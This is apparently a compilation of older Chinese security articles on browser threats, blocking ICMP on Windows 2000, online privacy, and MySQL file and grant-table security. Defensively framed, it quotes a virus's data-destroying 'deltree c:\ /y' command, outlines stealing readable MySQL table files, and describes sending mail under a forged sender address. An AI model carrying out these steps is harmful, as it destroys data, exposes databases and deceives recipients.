避恶方法 可以通过关闭javascript并随时注意微软的安全补丁来解决。
隐形杀手3 Web欺骗
攻击者通过先攻入负责目标机域名解析的DNS服务器，然后把DNS-IP地址复位到一台他已经拿下超级用户权限的主机。
这类攻击目前在国内很少出现，但如果成功的话危害却非常大。而且可能会损失惨重。其攻击方法是：在他已经拿下超级用户权限的那台主机上伪造一个和目标机完全一样的环境，来诱骗你交出你的用户名和密码。比如说我们的邮件甚至网上的银行账号和密码。因为你面对的是一个和昨天一样的环境，在你熟练的敲入用户名和密码的时候。根本没有想到不是真正的主机。
避恶方法 上网时，最好关掉浏览器的javascript，使攻击者不能隐藏攻击的迹象，只有当访问熟悉的网站时才打开它，虽然这会减少浏览器的功能，但我想这样做还是值得的。还有就是不要从自己不熟悉的网站上链接到其他网站，特别是链接那些需要输入个人账户名和密码的网站。
隐形杀手4 控制用户机
目前这类问题主要集中在IE对Actives的使用上。
我们现在可以看一看自己IE的安全设置，对于“下载已签名的ActiveX控件”，现在的选项是“提示”。但你可能不知道，IE仍然有特权在无需提示的情况下下载和执行程序。这是一个严重的安全问题，我们可能在不知情的情况下被别人完全控制。
避恶方法 在注册表HKEY-LOCAL-MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatiblity”下为“Active Setup controls”创建一个基于CLSID的新建{6E449683-C509-11CF-AAFA-00AA00 B6015C}在新建下创建REGDWORD类型的值：Compatibility Flags 0x00000400。
隐形杀手5 非法格式化本地硬盘
这类代码的危害较大。只要你浏览了它的网页，你的硬盘就会被格式化。
这并不是耸人听闻，其实IE可以通过执行ActiveX而使硬盘被格式化并不是什么新漏洞，早在去年就有国外黑客发现这一问题，并公布了源代码，只是当时公布的漏洞源代码是对西班牙版的Windows，如果直接Copy下来的话对于中文版的Windows并没有什么用。但最近已经在国内的个别个人主页里发现了对中文版Windows的格式化本地硬盘的代码。你如果浏览含有这类代码的网页，浏览器只会出一个警告说：“当前的页面含有不完全的ActiveX，可能会对你造成危害”，问你是否执行。如果你选择“是”的话，你的本机硬盘就会被快速格式化，而且因为格式化时窗口是最小化的，你可能根本就没注意，等发现已悔之晚矣。
避恶方法 对于在浏览网页时出现的类似提示，除非你知道自己是在做什么，否则不要随便回答“是”。而且上述提示信息还可以被修改，如改成“Windows正在删除本机的临时文件，问你是否继续”，所以千万要注意！另：把本机的format.com、deltree.exe等危险命令改名也是一个办法。因为我们在Windows中要真正用到这些DOS命令的情况并不是很多，而很多宏病毒或危险代码就是直接调用这些DOS命令，如有名的国产宏病毒“七月杀手”，就是在Autoexec.bat中加入了deltree c:\ /y。
Win2000如何预防Ping攻击 
在Win2000中如何关闭ICMP(Ping) 
ICMP的全名是Internet Control and Message Protocal即网际网路控制消息/错误报文协定，这个协定主要是用来进行错误资讯和控制资讯的传递，例如著名的Ping和Tracert工具都是利用ICMP协议中的ECHO request报文进行的（请求报文ICMP ECHO类型8代码0，应答报文ICMP ECHOREPLY类型0代码0）。 
ICMP协议有一个特点---它是无连结的，也就是说只要发送端完成ICMP报文的封装并传递给路由器，这个报文将会象邮包一样自己去寻找目的地址，这个特点使得ICMP协议非常灵活快捷，但是同时也带来一个致命的缺陷---易伪造（邮包上的寄信人位址是可以随便写的），任何人都可以伪造一个ICMP报文并发送出去，伪造者可以利用SOCK_RAW编程直接改写报文的ICMP首部和IP首部，这样的报文携带的源位址是伪造的，在目的端根本无法追查，（攻击者不怕被抓那还不有恃无恐？）根据这个原理，外面出现了不少基于ICMP的攻击软体，有通过网路架构缺陷制造ICMP风暴的，有使用非常大的报文堵塞网路的，有利用ICMP碎片攻击消耗伺服器CPU的，甚至如果将ICMP协定用来进行通讯，可以制作出不需要任何TCP/UDP埠的木马......既然ICMP协议这么危险，我们为什么不关掉它呢？ 
我们都知道，Win2000在网路属性中自带了一个TCP/IP筛检程式，我们来看看能不能通过这里关掉ICMP协议，桌面上右击网上邻居->属性->右击你要配置的网卡->属性->TCP/IP->高级->选项->TCP/IP过滤，这里有三个筛检程式，分别为：TCP埠、UDP埠和IP协议，我们先允许TCP/IP过滤，然后一个一个来配置，先是TCP埠，点击"只允许"，然后在下面加上你需要开的埠，一般来说WEB伺服器只需要开80(www)，FTP伺服器需要开20(FTP Data)，21(FTP Control)，邮件伺服器可能需要打开25(SMTP),110(POP3)，以此类推......接着是UDP，UDP协定和ICMP协定一样是基于无连结的，一样容易伪造，所以如果不是必要（例如要从UDP提供DNS服务之类）应该选择全部不允许，避免受到洪水（Flood）或碎片（Fragment）攻击。最右边的一个编辑框是定义IP协议过滤的，我们选择只允许TCP协议通过，添加一个6（6是TCP在IP协议中的代码，IPPROTO_TCP=6）,从道理上来说，只允许TCP协议通过时无论UDP还是ICMP都不应该能通过，可惜的是这里的IP协议过滤指的是狭义的IP协议，从架构上来说虽然ICMP协定和IGMP协定都是IP协定的附属协定，但是从网路7层结构上ICMP/IGMP协定与IP协定同属一层，所以微软在这里的IP协议过滤是不包括ICMP协议的，也就是说即使你设置了“只允许TCP协议通过”，ICMP报文仍然可以正常通过，所以如果我们要过滤ICMP协定还需要另想办法。 
刚刚在我们进行TCP/IP过滤时，还有另外一个选项：IP安全机制（IP Security)，我们过滤ICMP的想法就要着落在它身上。 
打开本地安全策略，选择IP安全策略，在这里我们可以定义自己的IP安全策略。 
一个IP安全筛检程式由两个部分组成：过滤策略和过滤作，过滤策略决定哪些报文应当引起筛检程式的关注，过滤作决定筛检程式是“允许”还是“拒绝”报文的通过。要新建IP安全筛检程式，必须新建自己的过滤策略和过滤作：右击本机的IP安全策略，选择管理IP筛检程式，在IP筛检程式管理列表中建立一个新的过滤规则：ICMP_ANY_IN，源位址选任意IP，目标位址选本机，协定类型是ICMP，切换到管理筛检程式作，增加一个名为Deny的作，作类型为"阻止"（Block）。这样我们就有了一个关注所有进入ICMP报文的过滤策略和丢弃所有报文的过滤作了。需要注意的是，在位址选项中有一个镜像选择，如果选中镜像，那么将会建立一个对称的过滤策略，也就是说当你关注any IP->my IP的时候，由于镜像的作用，实际上你也同时关注了my IP->any IP，你可以根据自己的需要选择或者放弃镜像。 
再次右击本机的IP安全策略，选择新建IP过滤策略，建立一个名称为ICMP Filter的筛检程式，通过增加过滤规则向导，我们把刚刚定义的ICMP_ANY_IN过滤策略指定给ICMP Filter，然后在作选框中选择我们刚刚定义的Deny作，退出向导视窗，右击ICMP Filter并启用它，现在任何位址进入的ICMP报文都会被丢弃了。 
虽然用IP sec能够对ICMP报文进行过滤，不过作起来太麻烦，而且如果你只需要过滤特定的ICMP报文，还要保留一些常用报文（如主机不可达、网路不可达等），IP sec策略就力不从心了，我们可以利用win2000的另一个强大工具路由与远端存取控制（Routing & Remote Access）来完成这些复杂的过滤作。 
路由与远端存取控制是win2000用来管理路由表、配置VPN、控制远端存取、进行IP报文过滤的工具，默认情况下并没有安装，所以首先你需要启用它，打开"管理工具"->"路由与远端存取"，右击伺服器（如果没有则需要添加本机）选择"配置并启用路由及远端存取"，这时配置向导会让你选择是什么样的伺服器，一般来说，如果你不需要配置VPN伺服器，那么选择"手动配置"就可以了，配置完成后，主机下将出现一个IP路由的选项，在"常规"中选择你想配置的网卡（如果你有多块网卡，你可以选择关闭某一块的ICMP），在网卡属性中点击"输入筛选器"，添加一条过滤策略"from:ANY　to:ANY　协议:ICMP　类型:8 :编码:0　丢弃"就可以了（类型8编码0就是Ping使用的ICMP_ECHO报文，如果要过滤所有的ICMP报文只需要将类型和编码都设置为255） 
细心的朋友刚才可能已经发现，在输入、输出筛检程式的下面，还有一个"碎片检查"功能，这个功能使用来应付IP碎片攻击的，这已经超出了本文所讨论的范围，我会在以后的拒绝服务攻击的文章中继续和大家一起探讨的。Win2000的路由及远端存取是一个功能非常强大的工具集，如果你好好地研究，一定能发现更多的功能和技巧，如果你有什么心得体会，也请不吝告诉我，我的Email地址是：nbjt@hotmail.com
　 有很多朋友问过我：怎么样在Win2K下单独关闭一个端口？（比如危险的139） 
通常的说法是没法关一个，要关全部关（用TCP/IP筛检程式），其实如果用IP安全策略或者Routing & Remote Access就很方便了，想关哪个关哪个. 

如何做到在网上“踏雪无痕”
　　进入超市，小姐彬彬有礼地相迎：“尊敬的XX，欢迎第11次光临本店，上次您在我们这里购买了一件西服，本店又进了一批新款，需要我带路吗？”我想尽管小姐微笑服务，但你是否有一种隐私被窥探的感觉？
　　网络无秘密
　　凭什么要别人知道自己的葫芦里卖的什么药？在家中，我们可以放下厚厚的窗帘，但是在网上，我们早已把自己出卖。当我们进入网站，就开始被跟踪，机器忠实地记录着所浏览过的商品。当用E－mail给心爱的MM发电子情书时，也许网络中有人怀着无限的兴趣，正在欣赏你的文采……而所有这一切，都是我们不希望发生的。
　　网络隐私=个人资料＋在线隐私
　　网络隐私可分为个人资料和在线隐私。为了申请邮箱、注册抽奖或是网上购物，我们必须提供姓名、联系地址等个人资料，有时甚至涉及到出生年月、月收入等进一步资料。而且你在网上一举一动都受到监视，并且会“记录在案”。当所有的个人资料和在线隐私被汇集，个人对于网络就没有隐私可言，而整个网络社会，也就是一个完全没有秘密的虚拟社会。通过网络查找个人隐私并不是一件十分困难的事。当你的信息和在线隐私被一些别有用心的人掌握，后果是什么？
　　保护大法
　　我们如今所能做的就是在网中，尽量保护隐私不被“曝光”，以便妥善保护自己。下文给您一些参考。
　　1、注册要诀　申请免费电子邮件，尽量不使用真实姓名。倘若让你选择兴趣爱好，一概空选，因为有很多免费邮件服务公司就是根据该项收集注册用户资料，转手卖给第三方的网上商城或网上广告商，后者会根据兴趣推销他们的产品，这也是信箱中有时会收到莫名其妙的广告信的原因之一。
　　时下网上购物炒得很热，注册是在网站购物的前提条件之一。要注册成为网上商城的客户，注意这些网上商城是否提供了相关的隐私保护条款，即为保证不把客户资料透露给第三方。如果没有隐私保护条款，那么你就得替你的身份证号码、信用卡号码的安全捏一把汗。如果没有相关的隐私保护条款，即使网站承诺奖给你一辆奔驰，也要对注册斩钉截铁地说声：“No！”
　　2、匿名浏览　当你连线到一个网站浏览时，对方很容易能查出你从哪儿来(IP地址)、你所使用的操作系统类型、你的访问次数、你在网站的“运动”轨迹，对于商业网站来说，这可是新鲜生动的第一手资料啊！如果你害怕这些在线隐私受到“侵犯”，至少有两种方法可以解决这个问题：
　　第一是设置代理服务器。在IE 5.0中方法如下：从菜单中依次点击“工具→Internet选项→连接→局域网设置→使用代理服务器”，并分别填入代理服务器的“地址”和“端口号”。代理服务器(Proxy Server)是单机与目标站点间的一个“中转站”，它负责将网站的信息传给单机，而网站只能检测到代理服务器信息，并不能得到单机的信息，有效地保障了在线隐私安全。
　　第二是使用网上中间人，帮你匿名接上目标站点。此类网站有Anonymizer(http://www.anonymizer.com)、ProxyMate(http://www.proxymate.com)等，都是免费的.
3、匿名发信　网上每封邮件都带有发件人和收件人的邮箱地址。如果想发一封信，而又不想让对方知道信是你发的，则要采用匿名发信。方法一是通过匿名转信站，把你的邮件地址从邮件中抽去，代之一个随机地址再发送，这样对方收到后，根本无法知道是谁发送过来的。提供此类服务的网站有Anonymizer等。方法二则要简单得多，操作却相对繁琐。利用POP3收信一定要在邮件服务器(Mail Server)开设账户和密码，但是利用SMTP发信对绝大部分邮件服务器来说根本不需要账户和密码，直接使用就可以了。因此，在邮件客户端软件中随便填写一个电子邮件地址(不管正确与否)和一个SMTP服务器(该项一定要有效)，POP3则填写你电子邮箱的POP3服务器以及账户、密码。经过这样“伪装”发出的信，对方虽然可以查看到SMTP服务器以及“电邮地址”，却根本不知对方身份。另外，为了邮件内容的安全，如有需要，请加密发送。
　　4、都是Cookie惹的祸　Cookie？小甜饼？在网络中，稍有疏忽，Cookie就会变为致命的小甜饼，成为泄露你个人资料的祸首。如果你对Cookie并不熟悉，我想你一定在网上遇到过这种经历：当你进入一个网站时，页面上出现“欢迎你第XX次访问，再次谢谢您的光临！”之类的话语。你或许会有所警觉，但同时又充满好奇：它怎么知道这是我第11次访问？这是Cookie搞的鬼。当然，这仅是其表现出来的一个方面，其他的如自动完成功能，也是Cookie在起作用。Cookie其实就是网站在你硬盘上留下的小记录，为TXT文本文件，用来记录您在网站中输入的信息或你访问站点时所做的选择。Cookie的本意是友好的，其出发点是为了方便用户访问网站。如果你使用的是IE浏览器，请打开文件夹c:windowscookies，你就可以看到Cookie真实的面目了。呵，很多网站的注册信息都在其中，包括用户名、密码等一系列信息，一目了然！如果有人通过局域网访问你的硬盘或通过Internet入侵硬盘，那……简直不可想象！赶快清除Cookie！如何清除？可手工删除，也可使用专用清除软件，如Safe Clean、System Mechanic。
　　Cookie虽然带来了便利，但其安全性能令人担忧。釜底抽薪是最彻底的办法，禁用Cookie就可以解决问题的症结。在IE中，我们可以从其“Internet选项”的“高级”标签卡中关掉Cookie功能。系统不接受Cookie，当然也就不会泄漏由Cookie造成的任何网络隐私。如果你既想使用Cookie的便利性，又不希望造成任何隐私泄露，以IE为例，可以为不同的安全区域指定不同的设置。如果站点位于“可信站点”或“本地Intranet”区域，则允许站点创建Cookie；如果位于“受限站点”，则禁止接受Cookie。既然如此，我们可以充分利用这一特性，把一些需要个人密码的站点打入“受限站点”的“黑名单”，则相关隐私再也不会被Cookie给出卖了。此之谓“一石二鸟”，不亦乐乎？ 
※为MySQL安全性指南 
作为一个MySQL的系统管理员，你有责任维护你的MySQL数据库系统的数据安全性和完整性。本文主要主要介绍如何建立一个安全的MySQL系统，从系统内部和外部网络两个角度，为你提供一个指南。 
本文主要考虑下列安全性有关的问题： 
?为什么安全性很重要，你应该防范那些攻击？ 
?服务器面临的风险（内部安全性），如何处理？ 
?连接服务器的客户端风险（外部安全性），如何处理？ 
MySQL管理员有责任保证数据库内容的安全性，使得这些数据记录只能被那些正确授权的用户访问，这涉及到数据库系统的内部安全性和外部安全性。 
内部安全性关心的是文件系统级的问题，即，防止MySQL数据目录（DATADIR）被在服务器主机有账号的人（合法或窃取的）进行攻击。如果数据目录内容的权限过分授予，使得每个人均能简单地替代对应于那些数据库表的文件，那么确保控制客户通过网络访问的授权表设置正确，对此毫无意义。 
外部安全性关心的是从外部通过网络连接服务器的客户的问题，即，保护MySQL服务器免受来自通过网络对服务器的连接的攻击。你必须设置MySQL授权表（grant table），使得他们不允许访问服务器管理的数据库内容，除非提供有效的用户名和口令。 
下面就详细介绍如何设置文件系统和授权表mysql，实现MySQL的两级安全性。 
一、内部安全性-保证数据目录访问的安全
MySQL服务器通过在MySQL数据库中的授权表提供了一个灵活的权限系统。你可以设置这些表的内容，允许或拒绝客户对数据库的访问，这提供了你防止未授权的网络访问对你数据库攻击的安全手段，然而如果主机上其他用户能直接访问数据目录内容，建立对通过网络访问数据库的良好安全性对你毫无帮助，除非你知道你是登录MySQL服务器运行主机的唯一用户，否则你需要关心在这台机器上的其他用户获得对数据目录的访问的可能性。
以下是你应该保护的内容： 
?数据库文件。很明显，你要维护服务器管理的数据库的私用性。数据库拥有者通常并且应该考虑数据库内容的安全性，即使他们不想，也应该考虑时数据库内容公开化，而不是通过糟糕的数据目录的安全性来暴露这些内容。 
?日志文件。一般和更新日志必须保证安全，因为他们包含查询文本。对日志文件有访问权限的任何人可以监视数据库进行过的操作。
更要重点考虑的日志文件安全性是诸如GRANT和SET PASSWORD等的查询也被记载了，一般和更新日志包含有敏感查询的文本，包括口令（MySQL使用口令加密，但它在已经完成设置后才运用于以后的连接建立。设置一个口令的过程设计象GRANT或SET PASSWORD等查询，并且这些查询以普通文本形式记载在日志文件中）。如果一个攻击者犹如日文件的读权限，只需在日志文件上运行grep寻找诸如GRANT和PASSWORD等词来发现敏感信息。 
显然，你不想让服务器主机上的其他用户有数据库目录文件的写权限，因为他们可以重写你的状态文件或数据库表文件，但是读权限也很危险。如果一个数据库表文件能被读取，偷取文件并得到MySQL本身，以普通文本显示表的内容也很麻烦，为什么？因为你要做下列事情： 
?在服务器主机上安装你自己“特制”的MySQL服务器，但是有一个不同于官方服务器版本的端口、套接字和数据目录。 
?运行mysql_install_db初始化你的数据目录，这赋予你作为MySQL root用户访问你的服务器的权限，所以你有对服务器访问机制的完全控制，它也建立一个test数据库。 
?将对应于你想偷取得表文件拷贝到你服务器的数据库目录下的test目录。 
?启动你的服务器。你可以随意访问数据库表，SHOW TABLES FROM test显示你有一个偷来的表的拷贝，SELECT *显示它们任何一个的全部内容。 
?如果你确实很恶毒，将权限公开给你服务器的任何匿名用户，这样任何人能从任何地方连接服务器访问你的test数据库。你现在将偷来的数据库表公布于众了。 
在考虑一下，从相反的角度，你想让别人对你这样吗？当然不！你可以通过在数据库录下执行ls -l命令确定你的数据库是否包含不安全的文件和目录。查找有“组”和“其他用户”权限设置的文件和目录。下面是一个不安全数据目录的一部分列出：
　% ls -l
total 10148
drwxrwxr-x 11 mysqladm wheel 1024 May 8 12:20 .
drwxr-xr-x 22 root wheel 512 May 8 13:31 ..
drwx------ 2 mysqladm mysqlgrp 512 Apr 16 15:57 menagerie
drwxrwxr-x 2 mysqladm wheel 512 Jan 25 20:40 mysql
drwxrwxr-x 7 mysqladm wheel 512 Aug 31 1998 sql-bench
drwxrwxr-x 2 mysqladm wheel 1536 May 6 06:11 test
drwx------ 2 mysqladm mysqlgrp 1024 May 8 18:43 tmp
....
正如你看到的，有些数据库有正确的权限，而其他不是。本例的情形是经过一段时间后的结果。较少限制的权限由在权限设置方面比更新版本更不严格的较早版本服务器设置的（注意更具限制的目录menageria和tmp都有较近日期）。MySQL当前版本确保这些文件只能由运行服务器的用户读取。
让我们来修正这些权限，使得只用服务器用户可访问它们。你的主要保护工具来自于由UNIX文件系统本身提供的设置文件和目录属主和模式的工具。下面是我们要做的： 
?进入该目录 
% cd DATADIR
?设置所有在数据目录下的文件属主为由用于运行服务器的账号拥有（你必须以root执行这步）。在本文使用mysqladm和mysqlgrp作为该账号的用户名和组名。你可以使用下列命令之一改变属主： 
# chown mysqladm.mysqlgrp . 
# find . -follow -type d -print | xargs chown mysqladm.mysqlgrp
?设置你的数据目录和数据库目录的模式使得他们只能由mysqladm读取，这阻止其他用户访问你数据库目录的内容。你可以用下列命令之一以root或mysqladm身份运行。 
% chmod -R go-rwx .
% find . -follow -type d -print | xargs chmod go-rwx
?数据目录内容的属主和模式为mysqladm设置。现在你应该保证你总是以mysqladm用户运行服务器，因为现在这是唯一由访问数据库目录权限的用户（除root）。 
在完成这些设置后，你最终应该得到下面的数据目录权限： 
% ls -l
total 10148
drwxrwx--- 11 mysqladm mysqlgrp 1024 May 8 12:20 .
drwxr-xr-x 22 root wheel 512 May 8 13:31 ..
drwx------ 2 mysqladm mysqlgrp 512 Apr 16 15:57 menagerie
drwx------ 2 mysqladm mysqlgrp 512 Jan 25 20:40 mysql
drwx------ 7 mysqladm mysqlgrp 512 Aug 31 1998 sql-bench
drwx------ 2 mysqladm mysqlgrp 1536 May 6 06:11 test
drwx------ 2 mysqladm mysqlgrp 1024 May 8 18:43 tmp
二、外部安全性-保证网络访问的安全
MySQL的安全系统是很灵活的，它允许你以多种不同方式设置用户权限。一般地，你可使用标准的SQL语句GRANT和REVOKE语句做，他们为你修改控制客户访问的授权表，然而，你可能由一个不支持这些语句的老版本的MySQL（在3.22.11之前这些语句不起作用），或者你发觉用户权限看起来不是以你想要的方式工作。对于这种情况，了解MySQL授权表的结构和服务器如何利用它们决定访问权限是有帮助的，这样的了解允许你通过直接修改授权表增加、删除或修改用户权限，它也允许你在检查这些表时诊断权限问题。
关于如何管理用户账号，见《MySQL的用户管理》。而对GRANT和REVOKE语句详细描述，见《MySQL参考手册》。
2.1 MySQL授权表的结构和内容
通过网络连接服务器的客户对MySQL数据库的访问由授权表内容来控制。这些表位于mysql数据库中，并在第一次安装MySQL的过程中初始化（运行mysql_install_db脚本）。授权表共有5个表：user、db、host、tables_priv和columns_priv。
表1 user、db和host授权表结构 
访问范围列
user db host 
Host Host Host 
User Db Db 
Password User 
数据库/表权限列 
Alter_priv Alter_priv Alter_priv 
Create_priv Create_priv Create_priv 
Delete_priv Delete_priv Delete_priv 
Drop_priv Drop_priv Drop_priv 
Index_priv Index_priv Index_priv 
Insert_priv Insert_priv Insert_priv 
References_priv References_priv References_priv 
Select_priv Select_priv Select_priv 
Update_priv Update_priv Update_priv 
File_priv Grant_priv Grant_priv 
Grant_priv 
Process_priv 
Reload_priv 
Shutdown_priv 　 
表2 tables_priv和columns_priv属权表结构 
访问范围列 
tables_priv columns_priv 
Host Host 
Db Db 
User User 
Table_name Table_name 
Column_name 
权限列 
Table_priv Column_priv 
授权表的内容有如下用途： 
?user表
user表列出可以连接服务器的用户及其口令，并且它指定他们有哪种全局（超级用户）权限。在user表启用的任何权限均是全局权限，并适用于所有数据库。例如，如果你启用了DELETE权限，在这里列出的用户可以从任何表中删除记录，所以在你这样做之前要认真考虑。 
?db表
db表列出数据库，而用户有权限访问它们。在这里指定的权限适用于一个数据库中的所有表。 
?host表
host表与db表结合使用在一个较好层次上控制特定主机对数据库的访问权限，这可能比单独使用db好些。这个表不受GRANT和REVOKE语句的影响，所以，你可能发觉你根本不是用它。 
?tables_priv表
tables_priv表指定表级权限，在这里指定的一个权限适用于一个表的所有列。 
?columns_priv表
columns_priv表指定列级权限。这里指定的权限适用于一个表的特定列。 
在“不用GRANT设置用户”一节里，我们再讨论GRANT语句如何对修改这些表起作用，和你怎样能通过直接修改授权表达到同样的效果。 
tables_priv和columns_priv表在MySQL 3.22.11版引进（与GRANT语句同时）。如果你有较早版本的MySQL，你的mysql数据库将只有user、db和host表。如果你从老版本升级到3.22.11或更新，而没有tables_priv和columns_priv表，运行mysql_fix_privileges_tables脚本创建它们。 
MySQL没有rows_priv表，因为它不提供记录级权限，例如，你不能限制用户于表中包含特定列值的行。如果你确实需要这种能力，你必须用应用编程来提供。如果你想执行建议的记录级锁定，你可用GET_LOCK()函数做到。 
授权表包含两种列：决定一个权限何时运用的范围列和决定授予哪种权限的权限列。 
2.1.1 授权表范围列
授权表范围列指定表中的权限何时运用。每个授权表条目包含User和Host列来指定权限何时运用于一个给定用户从给定主机的连接。其他表包含附加的范围列，如db表包含一个Db列指出权限运用于哪个数据库。类似地，tables_priv和columns_priv表包含范围字段，缩小范围到一个数据库中的特定表或一个表的特定列。 
2.1.2 授权表权限列
授权表还包含权限列，他们指出在范围列中指定的用户拥有何种权限。由MySQL支持的权限如下表所示。该表使用GRANT语句的权限名称。对于绝大多数在user、db和host表中的权限列的名称与GRANT语句中有明显的联系。如Select_priv对应于SELECT权限。 
2.1.3 数据库和表权限
下列权限运用于数据库和表上的操作。 
?ALTER
允许你使用ALTER TABLE语句，这其实是一个简单的第一级权限，你必须由其他权限，这看你想对数据库实施什么操作。 
?CREATE
允许你创建数据库和表，但不允许创建索引。 
?DELETE
允许你从表中删除现有记录。 
?DROP
允许你删除（抛弃）数据库和表，但不允许删除索引。 
?INDEX
允许你创建并删除索引。 
?REFERENCES
目前不用。 
?SELECT
允许你使用SELECT语句从表中检索数据。对不涉及表的SELECT语句就不必要，如SELECT NOW()或SELECT 4/2。 
?UPDATE
允许你修改表中的已有的记录。 
2.1.4 管理权限
下列权限运用于控制服务器或用户授权能力的操作的管理性操作。 
?FILE
允许你告诉服务器读或写服务器主机上的文件。该权限不应该随便授予，它很危险，见“回避授权表风险”。服务器确实较谨慎地保持在一定范围内使用该权限。你只能读任何人都能读的文件。你正在写的文件必须不是现存的文件，这防止你迫使服务器重写重要文件，如/etc/passwd或属于别人的数据库的数据目录。 
如果你授权FILE权限，确保你不以UNIX的root用户运行服务器，因为root可在文件系统的任何地方创建新文件。如果你以一个非特权用户运行服务器，服务器只能在给用户能访问的目录中创建文件。 
?GRANT
允许你将你自己的权限授予别人，包括GRANT。 
?PROCESS
允许你通过使用SHOW PROCESS语句或mysqladmin process命令查看服务器内正在运行的线程（进程）的信息。这个权限也允许你用KILL语句或mysqladmin kill命令杀死线程。 
你总是能看到或杀死你自己的线程。PROCESS权限赋予你对任何线程做这些事情的能力。 
?RELOAD
允许你执行大量的服务器管理操作。你可以发出FLUSH语句，你也能指性mysqladmin的reload、refresh、flush-hosts、flush-logs、flush-privileges和flush-tables等命令。 

?SHUTDOWN
允许你用mysqladmin shutdown关闭服务器。 
在user、db和host表中，每一个权限以一个单独的列指定。这些列全部声明为一个ENUM("N","Y")类型，所以每个权的缺省值是“N”。在tables_priv和columns_priv中的权限以一个SET表示，它允许权限用一个单个列以任何组合指定。这两个表比其他三个表更新，这就是为什么它们使用更有效的表示方式的原因。（有可能在未来，user、db和host表也用一个SET类型表示。） 
在tables_priv表中的Table_priv列被定义成： 
SET('Select','Insert','Update','Delete','Create','Drop','Grant','References','Index','Alter')
在coloums_priv表中的Column_priv列被定义成：　 
SET('Select','Insert','Update','References')
列权限比表权限少，因为列级较少的权限有意义。例如你能创建一个表，但你不能创建一个孤立的列。 
user表包含某些在其他授权表不存在的权限的列：File_priv、Process_priv、Reload_priv和Shutdown_priv。这些权限运用于你让服务器执行的与任何特定数据库或表不相关的操作。如允许一个用户根据当前数据库是什么来关闭数据库是毫无意义的。 
2.2 服务器如何控制客户访问
在你使用MySQL时，客户访问控制有两个阶段。第一阶段发生在你试图连接服务器时。服务器查找user表看它是否能找到一个条目匹配你的名字、你正在从那儿连接的主机和你提供的口令。如果没有匹配，你就不能连接。如果有一个匹配，建立连接并继续第二阶段。在这个阶段，对于每一个你发出的查询，服务器检查授权表看你是否有足够的权限执行查询，第二阶段持续到你与服务器对话的结束。 
本小节详细介绍MySQL服务器用于将授权表条目匹配到来的连接请求或查询的原则，这包括在授权表范围列中合法的值的类型、结合授权表中的权限信息的方式和表中条目被检查的次序。 
2.2.1 范围列内容
一些范围列要求文字值，但它们大多数允许通配符或其他特殊值。 
?Host 
一个Host列值可以是一个主机名或一个IP地址。值localhost意味着本地主机，但它只在你用一个localhost主机名时才匹配，而不是你在使用主机名时。假如你的本地主机名是pit.snake.net并且在user表中有对你的两条记录，一个有一个Host值或localhost，而另一个有pit.snake.net，有localhost的记录将只当你连接localhost时匹配，其他在只在连接pit.snake.net时才匹配。如果你想让客户能以两种方式连接，你需要在user表中有两条记录。 
你也可以用通配符指定Host值。可以使用SQL的模式字符“%”和“_”并具有当你在一个查询中使用LIKE算符同样的含义（不允许regex算符）。 SQL模式字符都能用于主机名和IP地址。如%wisc.edu匹配任何wisc.edu域内的主机，而%.edu匹配任何教育学院的主机。类似地，192.168.%匹配任何在192.168 B类子网的主机，而192.168.3.%匹配任何在192.168.3 C类子网的主机。 
%值匹配所有主机，并可用于允许一个用户从任何地方连接。一个空白的Host值等同于%。（例外：在db表中，一个空白Host值含义是“进一步检查host表”，该过程在“查询访问验证”中介绍。） 
从MySQL 3.23起，你也可以指定带一个表明那些为用于网络地址的网络掩码的IP地址，如192.168.128.0/17指定一个17位网络地址并匹配其IP地址是192.168.128前17位的任何主机。 
?User 
用户名必须是文字的或空白。一个空白值匹配任何用户。%作为一个User值不意味着空白，相反它匹配一个字面上的%名字，这可能不是你想要的。 
当一个到来的连接通过user表被验证而匹配的记录包含一个空白的User值，客户被认为是一个匿名用户。 
?Password 
口令值可以是空或非空，不允许用通配符。一个空口令不意味着匹配任何口令，它意味着用户必须不指定口令。 
口令以一个加密过的值存储，不是一个字面上的文本。如果你在Password列中存储一个照字面上的口令，用户将不能连接！GRANT语句和mysqladmin password命令为你自动加密口令，但是如果你用诸如INSERT、REPLACE、UPDATE或SET PASSWORD等命令，一定要用PASSWORD("new_password")而不是简单的"new_password"来指定口令。 
?Db
在columns_priv和tables_priv表中，Db值必须是真正的数据库名（照字面上），不允许模式和空白。在db和host中，Db值可以以字面意义指定或使用SQL模式字符'%'或'_'指定一个通配符。一个'%'或空白匹配任何数据库。 
?Table_name，Column_name
这些列中的值必须是照字面意思的表或列名，不允许模式和空白。 
某些范围列被服务器视为大小写敏感的，其余不是。这些原则总结在下表中。特别注意Table_name值总是被看作大小写敏感的，即使在查询中的表名的大小写敏感性对待视服务器运行的主机的文件系统而定（UNIX下是大小写敏感，而Windows不是）。 
表3 授权表范围列的大小写敏感性 
列 
Host
User
Password
Db
Table_name
Column_name
大小写敏感性 
No
Yes
Yes
Yes
Yes
No 
2.2.2 查询访问验证
每次你发出一个查询，服务器检查你是否有足够的权限执行它，它以user、db、tables_priv和columns_priv的顺序检查，知道它确定你有适当的访问权限或已搜索所有表而一无所获。更具体的说： 
?服务器检查user表匹配你开始连接的记录以查看你有什么全局权限。如果你有并且它们对查询足够了，服务器则执行它。 
?如果你的全局权限不够，服务器为你在db表中寻找并将该记录中的权限加到你的全局权限中。如果结果对查询足够，服务器执行它。 
?如果你的全局和数据库级组合的权限不够，服务器继续查找，首先在tables_priv表，然后columns_priv表。 
?如果你在检查了所有表之后仍无权限，服务器拒绝你执行查询的企图。 
用布尔运算的术语，授权表中的权限被服务器这样使用： 
user OR tables_priv OR columns_priv 
你可能疑惑为什么前面的描述只引用4个授权表，而实际上有5个。实际上服务器是这样检查访问权限： 
user OR (db AND host) OR tables_priv OR columns_priv 
第一个较简单的表达式是因为host表不受GRANT和REVOKE语句影响。如果你总是用GRANT和REVOKE管理用户权限，你绝不需要考虑host表。但是其工作原理你用该知道： 
?当服务器检查数据库级权限时，它对于客户查找db表。如果Host列是空的，它意味着“检查host表以找出哪一个主机能访问数据库”。 
?服务器在host表中查找有与来自db表的记录相同的Db列值。如果没有host记录匹配客户主机，则没有授予数据库级权限。如果这些记录的任何一个的确有一个匹配连接的客户主机的Host列值，db表记录和host表记录结合产生客户的数据库级权限。 
然而，权限用一个逻辑AND（与）结合起来，这意味着除非一个给定的权限在两个表中都有，否则客户就不具备该权限。以这种方式，你可以在db表中授予一个基本的权限集，然后使用host表对特定的主机有选择地禁用它们。如你可以允许从你的域中的所有主机访问数据库，但关闭了那些在较不安全区域的主机的数据库权限。 
